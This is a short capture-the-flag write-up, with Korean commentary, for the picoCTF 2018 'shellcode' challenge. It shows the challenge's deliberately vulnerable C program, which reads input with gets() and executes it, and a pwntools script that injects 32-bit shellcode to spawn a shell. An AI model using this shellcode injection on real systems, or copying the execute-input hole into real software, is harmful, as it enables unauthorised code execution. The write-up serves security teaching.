# picoCTF 2018

<h5> shellcode </h5>
<hr>

<h5> Solution </h5>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

<p> 이번 문제는 buf를 입력받지만, 해당 공간에 shellcode 를 작성해서 실행시키면 되는 문제이다. </p>
<p> 바이너리가 32비트 파일이기 때문에 32비트 환경에 맞는 shellcode 를 작성해주면 된다. </p>

```py
#!/usr/bin/python

p = process('./vuln')

shellcode = asm(shellcraft.i386.linux.sh())

p.sendline(shellcode)

p.interactive()
```